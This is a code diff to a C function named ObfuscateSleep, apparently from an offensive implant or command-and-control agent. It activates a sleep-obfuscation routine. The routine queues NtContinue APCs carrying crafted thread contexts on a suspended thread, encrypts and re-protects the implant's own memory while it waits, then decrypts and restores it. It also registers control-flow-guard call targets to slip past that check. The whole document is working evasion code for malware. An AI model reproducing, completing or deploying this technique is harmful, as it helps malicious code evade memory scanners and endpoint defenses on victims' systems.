@@ -77,9 +77,9 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     resume_len = Ctx->base.size;
 
     AddValidCallTarget(C_PTR(Ctx->win32.ExitThread));
-    //AddValidCallTarget(C_PTR(Ctx->nt.NtContinue));
+    AddValidCallTarget(C_PTR(Ctx->nt.NtContinue));
     AddValidCallTarget(C_PTR(Ctx->nt.NtTestAlert));
-    //AddValidCallTarget(C_PTR(Ctx->nt.NtDelayExecution));
+    AddValidCallTarget(C_PTR(Ctx->nt.NtDelayExecution));
     AddValidCallTarget(C_PTR(Ctx->nt.NtGetContextThread));
     AddValidCallTarget(C_PTR(Ctx->nt.NtSetContextThread));
     AddValidCallTarget(C_PTR(Ctx->nt.NtWaitForSingleObject));
@@ -93,27 +93,19 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     Ctx->nt.RtlInitUnicodeString( &src_uni, ksecdd_name );
     InitializeObjectAttributes( &sec_object, &src_uni, 0, nullptr, nullptr );
 
-    if (!NT_SUCCESS(ntstatus = Ctx->nt.NtOpenFile(&ksecdd, SYNCHRONIZE | FILE_READ_DATA, &sec_object, &ksecdd_iostat, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0))) {
-        success_(false);
-    }
+    x_ntassert(Ctx->nt.NtOpenFile(&ksecdd, SYNCHRONIZE | FILE_READ_DATA, &sec_object, &ksecdd_iostat, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0));
 
     src_cid.UniqueProcess = nullptr;
     src_cid.UniqueThread  = NtCurrentTeb()->ClientId.UniqueThread;
 
-    if (
-        !NT_SUCCESS(ntstatus = Ctx->nt.NtOpenThread(&src_thread, THREAD_ALL_ACCESS, &src_object, &src_cid)) ||
-        !NT_SUCCESS(ntstatus = Ctx->nt.NtCreateThreadEx(&rop_thread, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PTHREAD_START_ROUTINE)fake_frame->Rip, nullptr, true, 0, 0xFFFF, 0xFFFF, nullptr))) {
-        success_(false);
-    }
-
-    //ntstatus = Ctx->nt.NtCreateEvent(&sync_event, EVENT_ALL_ACCESS, NULL, 1, FALSE);
+    x_ntassert(Ctx->nt.NtOpenThread(&src_thread, THREAD_ALL_ACCESS, &src_object, &src_cid));
+    x_ntassert(Ctx->nt.NtCreateThreadEx(&rop_thread, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PTHREAD_START_ROUTINE)fake_frame->Rip, nullptr, true, 0, 0xFFFF, 0xFFFF, nullptr));
+    x_ntassert(Ctx->nt.NtCreateEvent(&sync_event, EVENT_ALL_ACCESS, NULL, 1, FALSE));
 
     stolen = (CONTEXT*) x_malloc(sizeof(CONTEXT));
     stolen->ContextFlags = CONTEXT_FULL;
 
-    if (!NT_SUCCESS(ntstatus = Ctx->nt.NtGetContextThread(rop_thread, stolen))) {
-        success_(false);
-    }
+    x_ntassert(Ctx->nt.NtGetContextThread(rop_thread, stolen));
 
     rop_buffer = (CONTEXT*) x_malloc(sizeof(CONTEXT));
 
@@ -137,7 +129,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
 	// insert argument chain here
 #endif
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_buffer, NULL, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_buffer, NULL, NULL));
     rop_set = (CONTEXT*) x_malloc(sizeof(CONTEXT));
 
     *rop_set = *stolen;
@@ -152,7 +144,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     *(uintptr_t*)(rop_set->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
     *(uintptr_t*)(rop_set->Rsp + 0x28) = (uintptr_t) &ContextMemPrt;
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_set, NULL, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_set, NULL, NULL));
     rop_enc = (CONTEXT*) x_malloc(sizeof(CONTEXT));
 
     *rop_enc = *stolen;
@@ -172,7 +164,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     *(uintptr_t*)(rop_enc->Rsp + 0x48) = (uintptr_t) target_region;
     *(uintptr_t*)(rop_enc->Rsp + 0x50) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_enc, NULL, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_enc, NULL, NULL));
     context_cap = (CONTEXT*) x_malloc(sizeof(CONTEXT));
     cap_mem     = (CONTEXT*) x_malloc(sizeof(CONTEXT));
 
@@ -186,7 +178,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
 
     *(uintptr_t*)(context_cap->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, context_cap, NULL, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, context_cap, NULL, NULL));
     context_set = (CONTEXT*) x_malloc(sizeof(CONTEXT));
 
     *context_set = *stolen;
@@ -198,7 +190,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
 
     *(uintptr_t*)(context_set->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, context_set, NULL, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, context_set, NULL, NULL));
     rop_del = (CONTEXT*) x_malloc(sizeof(CONTEXT));
 
 //
@@ -220,7 +212,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
 
     *(uintptr_t*)(rop_del->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_del, NULL, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_del, NULL, NULL));
 
 //
 // WAIT FUNCTION ENDS HERE
@@ -245,7 +237,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     *(uintptr_t*)(rop_dec->Rsp + 0x48) = (uintptr_t) target_region;
     *(uintptr_t*)(rop_dec->Rsp + 0x50) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_dec, NULL, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_dec, NULL, NULL));
     context_res = (CONTEXT*) x_malloc(sizeof(CONTEXT));
 
     *context_res = *stolen;
@@ -257,7 +249,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
 
     *(uintptr_t*)(context_res->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, context_res, NULL, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, context_res, NULL, NULL));
     rop_res = (CONTEXT*) x_malloc(sizeof(CONTEXT));
 
     *rop_res = *stolen;
@@ -272,7 +264,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     *(uintptr_t*)(rop_res->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert ;
     *(uintptr_t*)(rop_res->Rsp + 0x28) = (uintptr_t) &ContextResPrt;
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_res, NULL, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_res, NULL, NULL));
     rop_ext = (CONTEXT*) x_malloc(sizeof(CONTEXT));
 
     *rop_ext = *stolen;
@@ -283,9 +275,9 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
 
     *(uintptr_t*)(rop_ext->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_ext, NULL, NULL);
-    //ntstatus = Ctx->nt.NtAlertResumeThread(rop_thread, &success_count);
-    //ntstatus = Ctx->nt.NtSignalAndWaitForSingleObject(sync_event, rop_thread, true, NULL);
+    x_ntassert(Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_ext, NULL, NULL));
+    x_ntassert(Ctx->nt.NtAlertResumeThread(rop_thread, &success_count));
+    x_ntassert(Ctx->nt.NtSignalAndWaitForSingleObject(sync_event, rop_thread, true, NULL));
 
     defer:
     if (rop_dec)        { x_free(rop_dec); }
